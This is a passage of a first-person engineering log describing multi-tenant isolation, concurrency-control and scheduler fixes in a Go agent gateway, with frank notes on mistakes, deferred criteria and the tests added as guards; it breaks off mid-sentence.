`quota.FairShare` applies max-min fairness by workspace, sharing `ceil(C/N)`
because `floor(4/3)` leaves a slot permanently idle while three tenants queue
for it. The unit is the workspace, not the principal: per-principal would let a
workspace with fifty members take fifty shares from one with two.

Two things found while in there, both worth recording:

- **`HandleStatus` read a different key than the middleware enforced on**, so
  the status endpoint reported a usage figure unrelated to the limit that would
  refuse the next call. A status endpoint that lies is worse than none. Key
  construction now lives in two functions everything reads through — four
  hand-rolled key expressions is how a limiter ends up checking a bucket
  nothing fills.
- **Nothing in the gateway calls `RecordTokens*` at all**, so both token quotas
  are inert: the middleware checks a bucket no production code fills. That
  predates this work and is recorded in `docs/QUOTA_PRECEDENCE.md` rather than
  fixed blind — but the key had to be correct before wiring a recorder would
  mean anything.

Two mutations survived the first pass and each taught something. "Zero treated
as a ceiling" was invisible because with *every* level unconfigured for a
dimension the answer is zero either way — it only shows once some level limits
a *different* dimension. And "promotion drains one workspace" survived because
the contention test asserted only that everyone eventually completed, not the
order; fixing that surfaced a real race in the test itself, where three
goroutines competing to enqueue made arrival order nondeterministic.

### Revalidation is not admission (MU-025)

Criteria 1 and 2 were already met, and checking that rather than assuming it
was the first useful thing this story produced: the sweep lists agents, tails
events and writes proposals entirely per workspace, with an explicit
fail-closed fallback — a single-tenant tailer returns nothing for a named
workspace rather than serving the personal workspace's runs into that tenant's
queue.

**What was missing is that nothing was rechecked before committing.** A sweep
runs every six hours and takes as long as the evidence is wide. It reads an
agent definition, tails thousands of events, builds proposals, and only then
writes. An operator who turns learning off in that window is enforcing a policy
the job never looks at again.

Two checks now run immediately before anything is written, and the second one
has a subtlety that cost me a test:

- **Workspace status** is a hook rather than a column, because workspaces have
  no lifecycle on this branch. Inventing one to check against would be
  box-ticking; taking a function an operator or MU-032 supplies is the accurate
  answer. An *unreachable* status source is an error, not a pass — a skipped
  sweep is recoverable, a write into a suspended tenant is not. And one
  uncommittable workspace skips that workspace, never the sweep: a bare
  `return err` in a loop over tenants lets one suspended customer stop learning
  for everybody.
- **Agent policy is re-READ, not re-checked.** The loop's `def` is a pointer
  captured before the tail; testing `def.Learning.Enabled` again proves nothing
  that was not already true. Two mutations survived my first pass here and both
  pointed at the same flaw in the *test*: I was mutating the world from inside
  the workspace-status hook, which fires before the agent list is even read. So
  the loop simply never saw the agent, and what I had proved was "the loop
  skips absent agents" — not "the commit re-reads them". Moving the mutation
  into the tailer put it in the window that actually matters.

**Cross-workspace learning is not merely disabled by default; it is
inexpressible.** Every read and write goes through `Stores.For(workspaceID)`.
There is no aggregate cache and no shared vector index for learning to leak
through, because there is no API taking two workspaces —
`TestNoCrossWorkspaceSharingSurfaceExists` fails the build on an exported
function with two workspace parameters.

**Criterion 3 is deferred, not satisfied, and that is a decision rather than an
omission.** "Organization-wide sharing requires an explicit policy, source
attribution, redaction, and opt-in destination" describes governance for a
feature that does not exist and has not been specified. Building it now would
be four abstractions guarding nothing, rewritten the moment somebody designed
the actual feature. The guard above is what makes the deferral enforceable:
anyone adding a sharing surface has to delete a failing test, and the test
tells them what the criterion requires before they do.

Criterion 4's lineage rules were already implemented and are now written down
in `docs/LEARNING_LINEAGE.md` — including the limit that lineage is tracked by
session ID, so a hand-authored proposal with no session has no link to
invalidate through.

### Two tenants' "support-bot" both passed the same check (MU-026 criterion 7)

The event authorizer was careful about *principals* and silent about
*tenants* on one path. An event with a session consults the durable owner
record, which carries a workspace. An event WITHOUT one — tool progress, run
status, errors — had no owner record, so tenancy rested entirely on:

```go
s.rbacManager.CanAccessAgentResourceInWorkspace(
    principal.WorkspaceID, principal.Role, event.AgentID, ...)
```

That asks whether the **subscriber's** workspace lets their role read an agent
with that ID. It never asks whether the **event** belonged to that workspace.
Agent IDs are unique per workspace, not per deployment — the same collision
that broke the scheduler and the rate limiter — so two tenants with a
`support-bot` both satisfied it, and each received the other's sessionless
events.

The fix has two halves because the two cases are genuinely different:

- **A stamped event may never cross**, whatever the owner record says.
  `Engine.emit` stamps the run's workspace, so this covers every event a run
  produces and is strictly stronger than owner-based authorization — it also
  catches a stale or wrong owner record.
- **An unstamped sessionless event has nothing establishing its tenant at
  all**, so it is refused for any named workspace. Personal keeps receiving it,
  which is what a single-tenant deployment has always seen.

**The first version of this fix was too strong and a test caught it.** I made
the workspace comparison unconditional, which broke a legitimate case: an
unstamped event *with* a session, where the durable owner record — not the
absent stamp — is the verified fact. Treating "no stamp" as "personal
workspace" there would deny a tenant their own sessions. The scope of a
fail-closed check matters as much as its presence.

### A replay buffer is a second delivery path (MU-026 criterion 4)

A dropped WebSocket is the ordinary case, not the exceptional one: a laptop
sleeps, a phone changes network, a proxy times out an idle connection. On
reconnect the client has a gap it cannot see, and the events it missed are
exactly the ones it was watching for.

The buffer is easy; the three things around it are where this goes wrong, and
two of them fail in a way that *looks like success*.

**Replay is not a bypass.** The obvious implementation — remember what we sent
this client, resend it — does not apply here, because a reconnecting client is
a NEW connection with a new principal. What it was allowed to see before is not
the question. Buffered events are re-authorized on the way out through the same
authorizer the live broadcast uses, so a replay feature cannot become the leak
the live path was careful to prevent.

**A cursor is workspace-bound, and the subscription is the authority.** The
workspace is encoded in the cursor so a foreign one can be *detected*, but
`Since` compares it to the subscription's workspace and refuses a mismatch
rather than reading the workspace out of the cursor. Trusting the cursor would
make a client-supplied string the authority on whose history it gets.

**Falling off the window is an answer.** A bounded buffer necessarily forgets.
Silently starting from the oldest retained event looks exactly like a successful
resume and loses everything in between — the worst outcome available, because
the client believes it is caught up. `ErrCursorGap` says what is still retained
so the client refetches from the durable action log.

A fourth case emerged while testing: a cursor *ahead* of anything the workspace
ever issued. Reporting that as a gap would send a client after history it
already has; returning nothing would read as a successful catch-up. It is
`ErrCursorUnknown` — a third distinct answer, because collapsing it into either
of the other two is wrong in a different direction.

**Bounded per workspace, not globally.** A global ring lets one busy tenant
evict every other tenant's replay window, turning "resume works" into "resume
works unless somebody else is busy" — availability coupled across tenants,
which is the thing this milestone keeps taking apart. Sequences are per
workspace too, so one tenant's traffic cannot advance another's cursor and make
its client think it missed events.

Retention happens **before** broadcast: buffering afterwards leaves a window
where an event was delivered live and is not yet resumable.

### One serialization is still correct (MU-026 criterion 2)

I recorded this criterion as blocked on a performance tradeoff: `EventHub.Emit`
does one `json.Marshal` shared by every client, so a single payload "cannot" be
redacted per recipient, and fixing it meant either serializing per authorized
recipient — on the agent execution path, which `Emit` must never block — or
restructuring the event.

That framing was wrong, and noticing why was the whole story. **Authorization
here is a boolean gate.** A subscriber either receives an event or does not;
nothing about the payload varies by *who* receives it, only *whether* they do.
So one public projection, serialized once, satisfies the criterion and costs
nothing.

**And the honest version of what this buys.** No field on `message.Event` today
is something a permitted recipient must not see — a subscriber only ever
receives its own workspace's events, so its own workspace ID is not a
disclosure. This is a **boundary, not a fix**. Its value is entirely in the
future: the next field added for the authorizer's benefit — a principal, a
credential ID, a policy snapshot — cannot reach the wire by default.

Three things make the boundary hold rather than document itself:

- `publicEvent` is field-for-field explicit and **does not embed**
  `message.Event`. An embedded struct silently gains whatever is added to its
  parent, which is exactly the failure being prevented.
- `TestEveryEventFieldIsClassified` fails the build on an unclassified field,
  and also on a *stale* entry naming a field that no longer exists — a stale
  `false` is a rule silently protecting nothing.
- `TestTheHubNeverMarshalsAnEventDirectly` reads the source, because today
  `project(event)` produces byte-identical JSON to marshalling the event and a
  bypass would behave identically. Asserting on output could not tell; the call
  site is load-bearing now rather than once somebody classifies a field
  internal and an unrelated change quietly leaks it.

### The cancel endpoint said "cancelled" and meant "still running" (MU-027)

`handleCancelRun` transitioned a RUNNING run straight to `cancelled` — a
terminal state — and its own comment warned against exactly that:

> "cancelled" and "asked to cancel" are different promises, and a caller told
> the wrong one stops watching too early.

The code did the thing the comment forbade. Two consequences, and the second is
worse than the first:

- The API answered "cancelled" while the work was still executing and its side
  effects were still landing.
- **Nothing made the worker observe it.** `executeDurableRun` ran
  `engine.Handle` on a timeout context that no cancellation touched, so the run
  completed in full and only its *outcome* was discarded — `finishRun` found
  the record terminal and logged "the cancellation stands". The person who
  cancelled got a confirmation, and the shell command, the HTTP call and the
  file write all happened anyway.

`cancelling` is now a non-terminal state, and `running → cancelled` is
**removed from the transition table** rather than merely unused: a running run
has a worker mid-operation, and declaring it finished is a promise only that
worker can keep. `cancelling → succeeded` is absent for the same kind of
reason — work that finished after somebody asked it to stop did not succeed in
any sense they would accept.

The worker polls its own record between bounded operations. Polling rather than
a channel because **the cancel may arrive at a different gateway process**: an
in-memory signal only reaches a worker in the same process, which is the
arrangement MU-023 spent a story removing from the scheduler. Two details that
would each be a bug on their own: the poll reads through `context.WithoutCancel`
so a run near its deadline can still observe its own cancellation, and a read
*failure* is not a cancellation — cancelling on an unreachable store would turn
a database hiccup into every in-flight run in the deployment dying at once.

Two mutations survived the first pass, and both were tests proving the wrong
thing:

- Nothing asserted that `running → cancelled` is *refused*, because
  `RequestCancel` never attempts it. The table needed a direct assertion.
- `finishCancelled` could be deleted from `executeDurableRun` entirely and every
  behavioural test still passed, because the test called it directly. Worse,
  the real consequence is not "recorded as failed" — `cancelling → succeeded`
  is illegal, so the write simply fails and the run sits in `cancelling`
  **forever**, reading to a client as "still stopping". An AST guard now fails
  the build if the call site goes.

### One number fits every explanation (MU-027 criterion 6)

`AgentRunDuration` measured a run end to end. That single number is compatible
with every diagnosis — the provider is slow, the queue is deep, the engine is
doing too much — and those have opposite remediations: switch model, add
workers, profile the code. An operator with one number is guessing, and
criteria 1 and 2's p95 targets could not be *evaluated*, let alone met.

Three quantities were missing and are now separable:

- **Queue latency** (submission → a worker claiming it) — the number that
  answers "should I add workers", and the only one of the three that is
  entirely Soulacy's own responsibility.
- **External time** — provider and tool calls, accumulated per run.
- **Processing latency** — execution minus external: what Soulacy itself spent.
  A run that took 40 seconds because a provider took 39 needs a different
  response from one that took 40 because the engine did.

**Why the per-tenant view is derived from the record, not a labelled metric.**
The obvious move is a histogram labelled by workspace, and it is the classic
Prometheus footgun: cardinality grows with the number of tenants, so the metric
degrades the monitoring system exactly as the product succeeds. The run record
is already per-workspace and already carries the timestamps, so the per-tenant
view costs nothing and the process-wide histograms stay unlabelled.

Two details that would each be a bug alone: `RecordExternal` accumulates **in
SQL** rather than read-modify-write, because provider and tool calls happen
concurrently from different goroutines and a read-then-write loses increments
under exactly the concurrency being measured; and it stores **microseconds**,
because a fast tool call rounds to zero milliseconds and a run of a hundred
400µs calls would report nothing.

Processing latency is clamped at zero. External time sums concurrent calls, so
parallel tool execution can legitimately exceed the wall clock — a negative
"processing time" is arithmetically explicable and operationally meaningless,
and a histogram that accepts it produces percentiles nobody can act on.

### A catalog claim the schema did not back

Writing a test for the above surfaced something else: `agent_runs` had
`id TEXT PRIMARY KEY`, while `internal/ownership/catalog.go` has declared it
`CompositeUniqueness: true` with `ScopeKey: "workspace_id,id"` since MU-020.

Reads were correctly scoped, so nothing leaked. But run IDs were **globally**
unique, which means submitting an ID another workspace already used returned a
constraint violation — a weak enumeration oracle over other tenants' run IDs
(product invariant 8). And more to the point, the machine-checked source of
truth was asserting something the storage did not do, which is worse than a
missing feature: it is a guard reporting success.

The key is now composite, with a rebuild migration for existing databases. The
OLD table is renamed aside rather than the new one being given a temporary
name, so `agent_runs` stays the only name ever `CREATE`d — the catalog's
discovery scan treats every `CREATE TABLE` as a durable store to classify, and
a scratch table would show up as one. That is the same trap the
`workflow_checkpoints` migration hit in M4.

### The reconnection policy is the feature (MU-027 criterion 4)

There is no `sy run` command yet — MU-020 built the durable run API and nothing
drives it from a terminal. Rather than start with the cobra surface, the piece
worth building first is the part that is hard to get right and easy to get
wrong silently: what a follower does when the connection drops.

`internal/runfollow` is a plain value with no I/O, because a policy entangled
with a WebSocket can only be tested by running one.

Four decisions, each of which fails quietly if made the other way:

- **Backoff resets on a successful CONNECTION, not per attempt.** Resetting per
  attempt makes the schedule constant, so a server that accepts a connection
  and drops it immediately gets retried at the floor forever — which is the
  thundering herd the backoff exists to prevent.
- **Jitter goes downward only.** Adding above the ceiling would let the delay
  exceed a bound the operator set, and a ceiling that is sometimes exceeded is
  not a ceiling. Without jitter at all, every follower disconnected by one
  gateway restart retries at the same instant, and synchronised retries are
  indistinguishable from an attack.
- **The cursor only moves forward, ordered NUMERICALLY.** A reconnect replays
  from the last position the server was told about, so stale frames arrive by
  design and rewinding on one means asking for them all again. And string
  comparison puts `ws:10` before `ws:9` — a follower using it would rewind nine
  events on every reconnect after the tenth.
- **A gap drops to the live edge and says so.** Three tempting alternatives are
  each worse: carrying on silently makes a stream that skipped
  indistinguishable from one that was quiet; starting from the beginning
  reprints a long run's whole history at the moment the user is watching for its
  last line; giving up abandons the events they are actually waiting for.

A foreign cursor is refused rather than adopted, for a reason specific to
MU-026's server side: the gateway refuses a cursor from another workspace, so a
follower that adopted one would be stranded at the live edge on every
subsequent reconnect.

### The write that disappears without an error (MU-028)

The failure optimistic concurrency prevents is undramatic, which is exactly why
it needs a mechanism rather than care. Two members open the same agent. One
saves. The other saves thirty seconds later from a form rendered before that,
and the first member's change is gone — no error, no conflict, nothing in the
UI that looks wrong. The only evidence is that work vanished, usually noticed
days later by whoever did it.

**The token is content-derived, not a counter.** A counter is the obvious
design and it needs coordination: two gateway replicas both incrementing
"version 4" produce two different "version 5"s for different content, and a
client that read one happily overwrites the other. That is the same
coordination problem MU-023 solved with claims, and it has the same answer —
derive rather than allocate. A hash of the stored bytes needs no agreement at
all. It also makes a no-op save detectable: saving an unedited form produces
the same token, so it is not a conflict for anyone to resolve.

**The decision that makes the mechanism worth having** is what happens when a
client sends no version at all. Allowing it through makes concurrency control
opt-in — and the client that forgets is precisely the one that overwrites
silently, every time, which is the bug. So it is refused where it matters, with
a *distinct* error from "stale": the remedies differ, and "reload and
reconcile" is useless advice to a client that is not participating in
versioning at all. A single-tenant install has nobody to conflict with and
keeps working unchanged (invariant 7).

**Matching is exact.** A truncated, extended or case-shifted token that
"nearly matches" is precisely the stale write being caught — though the
quoting and `W/` prefixes clients and proxies add are normalised away, because
those name the same content.

**The 409 carries the current version and the other actor.** A bare 409 forces
a refetch and races: between the conflict and the refetch the resource can
change again. And "somebody else changed this" without saying *who* is
unactionable in a team, where the remedy is usually a conversation the person
cannot have.

Wiring this into the agent and Studio handlers is the remaining work; the
primitives and their tests are the part where getting it wrong is silent.

### A survey I should have done first (MU-028 wiring)

I built `internal/concurrency` before checking whether the gateway already had
an ETag mechanism. It did — `resourceETag` and `checkIfMatch` in
`internal/gateway/idempotency.go`, already wired to `handleGetAgent` and
`handleUpdateAgent`. That is the survey-first rule this branch has relied on
repeatedly, violated by me, and it cost a package that mostly restated
something present.

What the survey would have found is that the mechanism was **real but
narrow**, and the gaps were the interesting part:

- Its own comment recorded the hole: *"A caller that supplies no If-Match is
  unchanged from today."* So concurrency control was **opt-in**, and the client
  that forgets is exactly the one that overwrites silently, every time.
- Of nine agent-mutating call sites, **one** checked. The uncovered one that
  matters most is the raw YAML editor: a whole-file replace, so a stale save
  discards every change made since the editor was opened, not just the
  overlapping field. Its GET did not even return a validator, so a client that
  wanted to be careful had nothing to send.
- The 409 carried the ETag and nothing else — no echo of what was sent, so a
  client with several edits in flight cannot tell which one lost.

The primitives were not wasted, but their value is narrower than I thought when
writing them: `checkIfMatch` mixed the decision with writing the HTTP response,
which is why it needed the awkward `rejected bool` its comment has to explain.
The policy now lives in one testable place and the handler is the shell around
it — the same collapse MU-022 made for approval eligibility, for the same
reason.

**428, not 409, for a missing precondition.** "You sent no version" and "your
version is stale" have different remedies, and a client told 409 will re-read
and retry — succeeding, and still not sending a precondition. The distinction
only matters because the two errors are otherwise easy to conflate, which is
how a mechanism stays opt-in while appearing enforced.

**Not done, and not faked:** criterion 5 asks the conflict to identify both
actors. `agent.Definition` carries no last-editor field — the actor goes to
`Loader.UpsertInWorkspace` and into the audit trail, a separate lookup this
synchronous path should not take on every conflict. `Conflict` handles the
unattributed case, so the message degrades to "changed since you loaded it"
rather than naming nobody. Closing it means reading the agent audit history
here. The remaining seven mutating call sites also still need covering; they
were not touched because verifying which are creates and which are updates
needs more care than a blanket edit.

*(Both were closed later — see "Three of the seven were already safe" and
"Provenance lives beside the definition" below. The cost estimate in the
paragraph above was the thing that was wrong: the lookup is only reached on
the conflict branch, so it is paid when two people collide and never on a
successful save.)*

### Three of the seven were already safe, and two of the real ones were "creates" (MU-028 criterion 2)

The handoff into this session named seven uncovered agent-mutating call sites.
Surveying them first — the rule this branch keeps re-learning — changed the
list rather than confirming it.

Thirteen call sites reach a durable agent write. Six need nothing, and the
reason is structural in every case rather than a check someone remembered:

- `handleCloneAgent` and `handleInstantiateTemplate` allocate a *free* id
  before writing (`uniqueAgentID`, `templates.uniqueID`), so they cannot land
  on an existing definition at all.
- `ensurePeerAgents` skips every peer that already resolves.
- `setAgentEnabled` is a read-modify-write of the **live** definition rather
  than of a form the client is holding. It loads the current agent and changes
  one boolean, so there is no stale copy for it to write back and a concurrent
  edit survives it.
- `handleUpdateAgent` and `handleUpdateAgentYAML` already checked.

The two most interesting of the remaining seven are not update handlers at
all, which is why a "cover the update paths" reading of the criterion would
have missed them:

- **`handleCreateAgent` called `Upsert`.** `POST /agents` with an id that
  already existed *replaced* that agent and answered `201 Created`. Two members
  both naming a bot the same obvious thing is not an exotic race; it is the
  ordinary way two people name the same thing. This is the exact failure MU-028
  exists to prevent, on the one path nobody guards because it is called
  "create".
- **`handleBuilderDeploy` is the same write with the id chosen by a model**
  from a natural-language description, which makes collision *more* likely
  rather than less: two people describing the same job get the same name.

So the guard is split in two rather than being one function with a boolean.
A create and an update fail for different reasons and the remedies differ:
"pick another id" is useless to someone editing an agent, and "reload and
merge" is useless to someone who did not know the agent existed. `409` on the
create path therefore says *"an agent with this id already exists"* and offers
both remedies — a different id, or `If-Match` to replace deliberately.

**A supplied precondition is always honoured, on every path.** A stale
`If-Match` on a create still loses, and `overwrite=true` on a package import
still loses, because otherwise versioning would be advisory on exactly the
paths where a client is least likely to be careful. `overwrite=true` says
"replace"; it does not say *which* definition the operator agreed to replace,
and between inspecting a package and importing it the agent can change.

`handleDeleteAgent` and `handleRollbackAgent` were the other two that mattered
and neither reads as an "update":

- A **delete** is the most complete stale write there is — it discards every
  edit made since the deleter last looked, not just the overlapping fields.
  Guarding it needed the definition, which the handler did not previously load;
  an *absent* agent stays exactly as quiet as before (204, because Delete is
  idempotent) rather than newly answering 404 or 428.
- A **rollback** replaces the whole file with older content and is issued by
  someone looking at *history* rather than at what is live, which makes it the
  write most likely to be made from a stale view.

Studio's code view got the check moved **before** validation, matching the REST
YAML editor: a write that is going to be refused should be refused on the first
reason it is refusable, and a stale save reported as "validation failed" sends
the author to fix the wrong thing.

**The guard that outlives the survey** is `TestEveryDurableAgentWriteChecksAPrecondition`,
which fails the build when a function performs a durable agent write without
either checking a precondition or being listed with the reason it cannot lose
work. A new agent-mutating handler is a dozen lines that compile, pass review,
and lose somebody's work only when two people happen to edit at once — the
survey above is exactly the work nobody will redo. A companion test fails when
an exemption names a function that no longer writes an agent, so the list
cannot become a place names go to die and be inherited by whatever takes that
name next.

### Provenance lives beside the definition, not inside it (MU-028 criterion 5)

The earlier note here said naming the other actor meant "reading the agent
audit history on every conflict", and deferred it as too expensive. Both halves
of that were wrong.

`agent.Definition` still carries no last-editor field, and it should not: that
would put provenance inside the document a user edits, where a raw YAML save
can rewrite it — the one thing an attribution must not allow. The answer
already existed *beside* the definition. `UpsertInWorkspace` snapshots the
outgoing bytes into the agent's version history and stamps them with the
principal doing the overwriting, and MU-019 gave those snapshots a sidecar
carrying that actor.

**The inversion is the part that is easy to get backwards.** A snapshot records
the content that was *replaced*, stamped with whoever replaced it. So the
*newest* snapshot names the author of what is **live now**, not the author of
the snapshot. Reading it the other way names the wrong person, which is worse
than naming nobody: it sends the loser of a conflict to the wrong conversation.
`LatestAgentVersionInWorkspace` carries that reasoning in its doc comment and
`TestTheNewestSnapshotNamesTheAuthorOfTheCurrentDefinition` pins it.

Two details worth keeping:

- **It is only reached on the conflict branch.** A 409 means two people were
  editing the same agent, which is rare by construction, so a directory read
  there buys an actionable message at a cost nobody pays on the success path.
  Doing it on every write — what the earlier note assumed — would have been the
  wrong trade, and is why it looked more expensive than it is.
- **It resolves through `s.agents(c)`**, so the workspace comes from the
  verified request rather than from the agent id. Agent ids are unique per
  workspace, not per deployment; an id-keyed history lookup would happily name
  another tenant's editor, which is the fourth appearance of the collision that
  broke the scheduler, the rate limiter and the event authorizer.

`LatestAgentVersionInWorkspace` reads one sidecar rather than all of them:
snapshot filenames are zero-padded UTC timestamps, so lexical order is
chronological and only the winner has to be decoded. `AgentVersionsInWorkspace()[0]`
would have decoded every snapshot on a path a client can drive by retrying.

### Two packages' tests had stopped compiling, which reads exactly like passing

Found while running the suite for the above, and unrelated to it.
`internal/runtime` and `internal/gateway` both failed to **build** their test
binaries: five test files still called `ConfirmBroker.RegisterRequest`,
`Register(callID)`, `Resolve(callID, bool)` and `List()`, all of which MU-022
replaced with context-carrying, workspace-aware, eligibility-checked
signatures.

A package whose tests do not compile reports no failures at all. In a
`go test ./...` run over a hundred-odd packages, two `FAIL … [build failed]`
lines sit among a wall of `ok` and read as noise. The two packages involved are
the engine and the gateway — between them they hold most of the isolation
guards this branch added, including every AST guard.

Repaired against the current API rather than deleted, and the repair is
itself informative: `Resolve` now needs an `approvals.Eligibility` carrying the
decider's *resolved* workspace, so the tests had to name a tenant to pass —
which is MU-022's point restated by the type system.

### The fix was inside the package and the callers were outside it (MU-023, reopened)

MU-023's write-up says the scheduler's key was the bug and lists the six maps
that were re-keyed: `entries`, `running`, `failCounts`, `blocks`,
`lastBackfills`, and the completed-fire state file. **Two of those six were not
actually re-keyed**, and the boundary was not covered at all. This is trap 2's
fourth and fifth appearance, and it is the reason to check every map keyed by
an agent ID rather than trusting a prior fix.

**`blocks` and `lastBackfills` were still `map[string]`.** Both are read back
by a tenant-facing status page, so the consequence is not merely a wrong
status:

- Two tenants with a `daily-report`. Tenant A's is refused by the readiness
  gate. `Entries()` looked the block up **by agent ID** while iterating a
  `(workspace, agent)`-keyed map, so tenant B's healthy schedule rendered as
  blocked, carrying A's summary and A's failed-requirement IDs.
- Worse in the other direction: `clearBlock` deletes by the same key, so B's
  *successful* pass silently cleared A's retained block. A refusal that
  disappears is the failure mode this whole branch keeps calling out — nothing
  surfaces.
- `lastBackfills` is the same shape for catch-up records: "this run was
  replayed at boot", attributed to a tenant in whose workspace it never
  happened.

**The readiness gate was asked about the wrong workspace, and it fails open.**
`blockedByReadiness` passed only an agent ID, and the gate adapter resolved the
workspace from `sched.PrincipalWorkspace` — one value for a Scheduler that
serves every tenant in the process. Certification is an *allow*, so a miss
there does not refuse the run: a neighbour's certified deployment clears a run
that was never certified at all. The workspace now travels with the question
(`ReadinessGate.ScheduleReadiness(workspaceID, agentID)`), and the adapter's
old function parameter survives only as a fallback.

**And every one of the gateway's twenty-two scheduler calls used the
workspace-free methods** — the ones `internal/scheduler/tenancy.go` describes
in its own comment as "the ones a caller should not be reaching for" in a
multi-user deployment. So in Team mode a save by tenant B registered B's agent
under the *scheduler's* principal workspace. The collision MU-023 removed came
straight back at the boundary: one cron entry, one run lock, one failure
counter for two tenants' same-named agents, with the later registration
silently replacing the earlier one. `GET /schedule` returned every workspace's
agent IDs and next-fire times, and `handleScheduleStatus` did the same for
running state and catch-ups — the operational signal MU-019 established one
team must not read about another.

`internal/gateway/scheduler_scope.go` is the fix, mirroring `agentScope` and
`studioScope`: a handler cannot reach the scheduler without first naming a
workspace. It resolves the workspace **exactly as `s.agents(c)` does**, on
purpose — an agent registered through one and scheduled through the other must
land in the same tenant, and two different resolutions is how they drift apart.

`TestTheSchedulerIsReachedThroughAScopedAccessor` is the part that outlives
this: it fails the build on a direct `s.scheduler.X` call, and — unlike the
store guard it is modelled on — it also fails on a method it does not
*recognise*. An unclassified method is not obviously safe, and inheriting
silence is how the previous twenty-two got written. Adding one means choosing
between "takes no workspace" and "here is the scoped call that replaces it".

One existing guard had to be re-aimed rather than deleted:
`TestBothStudioSavePathsSyncTheScheduler` greps the handler source for
`scheduler.DeregisterAgent(`. Its question — does a Studio save still sync the
cron table — is unchanged; only the spelling of the answer moved, so it now
matches the scoped call.

### The mechanism was unusable because nothing could obtain a version (MU-028 criterion 3)

Criterion 3 reads like UI polish. It is not: without it, criterion 2 breaks
every save in the product.

**Nothing in the GUI ever fetched a single agent.** `api.agents.get(id)` exists
and has no callers — Agents, Schedule, Flow and Studio all edit definitions out
of `GET /agents`. The two handlers that set an `ETag` header are
`GET /agents/:id` and `GET /agents/:id/yaml`; the list set none. So no client
could obtain a validator, and the requirement criterion 2 added ("a missing
precondition is refused in Team and Scale") would have refused **every** save
the moment a deployment left Personal.

`GET /agents` now returns a `versions` map beside `interfaces`. **Beside the
definition, never inside it**: `resourceETag` hashes the definition's own JSON,
so a version field within it would be a hash of something containing the hash —
the same reason the last-editor lookup lives in a snapshot sidecar rather than
in `SOUL.yaml`.

The test for it is a **round trip**, not a shape assertion. A `versions` map
carrying the wrong token passes any "does the field exist" check and fails
every save, which is the worse of the two bugs and the one a shape check cannot
see. Verified by replacing the token with a plausible constant and watching the
save get a 409.

**On the client, the precondition is applied by the transport.** Fifteen call
sites each remembering to thread a version is fourteen chances to reintroduce
the bug, and a caller that forgets to send one is exactly the caller that
overwrites silently. `apiFetch` records the `ETag` from every response, records
the per-agent map the list carries, and attaches `If-Match` to any mutating
request against an agent. A page opts *out* by sending its own header, never by
forgetting.

Two details in the client registry are load-bearing:

- **The key is the agent, not the path.** `/agents/x`, `/agents/x/yaml` and
  `/agents/x/rollback` are three ways to write one agent and the server derives
  one validator for all of them. Keyed per path, a save through the code view
  would carry a version obtained from the form view — a different string for the
  same content — and every cross-view save would be a false conflict.
- **A refused version is discarded.** Keeping a token the server has just
  called stale makes the next save fail identically for the same reason, and
  the user's only route back is a reload they were not told to do.

**"Overwrite" stays conditional, and that is the whole design.** It resends
with the version the server named in the 409 — it does not drop the header. So
overwrite means "replace the thing I was just shown", not "replace whatever is
there now": a third save landing between the conflict and the overwrite
conflicts again rather than being discarded. Dropping the precondition would
turn the deliberate choice back into the original bug, arrived at by a
different route and with the user's explicit blessing on the wrong thing. When
a 409 carries no current version there is nothing to name, so the dialog
refuses to offer Overwrite at all rather than falling back to an unconditional
write.

Compare fetches the server's content at the moment the user asks for it, rather
than trying to reconstruct it from the 409 — the body carries a version token,
not the content. A dialog that asserts "your changes conflict" and shows
nothing asks the user to take it on trust, and they will press Overwrite,
because it is the button that keeps their work.

The decision logic lives in `gui/src/lib/agentconflict.js` with the component
as its shell, the same collapse MU-022 made for approval eligibility: a policy
embedded in a Svelte component is a policy only a DOM test can reach, and the
cases worth pinning here — an unattributed conflict, a conflict with no current
version, an explicit header beating the remembered one — are awkward to drive
that way.

### The pin already existed and was filled with the wrong value (MU-028 criterion 4)

Surveying first changed this criterion from "build a deployment record" to
"stop lying in the one we have", which is the lesson this branch keeps
relearning after MU-028's own `internal/concurrency` misstep.

`runs.Run.AgentVersion` says in its own comment that it "pins what actually
ran" so that "an agent edited later must not change what this run means". Its
single production writer, `internal/gateway/runs.go`, filled it from
`strings.TrimSpace(def.Version)` — **trap 1 from the handoff, live in
production**. `agent.Definition.Version` is a string the *author* types into
SOUL.yaml: usually empty, never updated by an edit, entirely under the control
of whoever wrote the file. So:

- every run of an agent that never set `version:` — which is most of them — was
  pinned to `""`, and the field answered its own question with nothing;
- an edit that rewrote the system prompt and left the label alone produced two
  runs claiming the same version;
- an author could make two different definitions claim the same version, or one
  definition claim two.

The pin is now `def.ContentVersion()` — the same content-derived token the
ETag uses, with `resourceETag` delegating to it rather than re-deriving it.
Two derivations that agree by coincidence is one refactor away from "the
version I edited" and "the version that ran" quietly ceasing to be comparable.

**The version is hashed over YAML, not JSON, and that is the load-bearing
part.** The existing ETag hashed `json.Marshal(def)`, and that is not stable
across the round trip through the definition's own file: a nil slice is `null`
in JSON and `[]` in YAML, and parsing `[]` back yields an empty non-nil slice.
So an agent created through the API and *the same agent after a gateway
restart* had different tokens for identical content. Two consequences, both
invisible until two people are editing — the only situation the token exists
for:

- every client's held version was invalidated by a restart, producing a
  conflict against an editor who does not exist; and
- a run's pin could not be joined to the snapshot holding the bytes that
  produced it, because the two were hashed from different representations.

YAML is also the honest choice on its own terms: it is the storage format, so
this is the identity of the file rather than of one in-memory rendering of it.
`yaml.Marshal` renders nil and empty slices identically, emits fields in
declaration order and sorts map keys, so it is canonical and deterministic.

**The join.** A run names a version; the bytes that produced it become
retrievable the moment the definition is replaced, at which point they are
exactly one of the loader's snapshots. Those snapshots now record their own
`ContentVersion` in the sidecar, so "show me the definition this run executed"
is a lookup. Without a shared token the only way to line them up is by
timestamp — and a timestamp is precisely what a backup restore or a `cp -p`
rewrites, which is why the sidecar exists at all. A snapshot whose bytes no
longer parse records no version rather than a guessed one: a wrong join is
worse than an absent one, because it answers.

### Two more mechanisms that are configuration rather than behaviour

Found while surveying criterion 4. Both are the same shape as the inert token
quotas already recorded in `docs/QUOTA_PRECEDENCE.md`: a mechanism that reads
as working, is documented as working, and no production code drives.

1. **`studio.DeploymentStore.Record` has no caller.** The whole ST-16
   deployment record — certification evidence, rules version, provider config,
   the verbatim definition, append-only history, rollback — is written by
   nothing. `internal/app/wire.go` constructs the store only to *read* it
   through the scheduler's readiness gate, so `ScheduleReadiness` always
   returns `Deployed=false`, the gate always has no opinion, and **every
   scheduled agent runs uncertified**. The certification gate ST-16 built is
   not merely unenforced; it cannot fire.

   Left inert deliberately rather than wired in passing, because wiring it is
   not a small change: `ScheduleReadiness` treats a record with no
   certification as **blocked**, so the moment anything starts recording
   deployments, every scheduled agent that has not been certified through
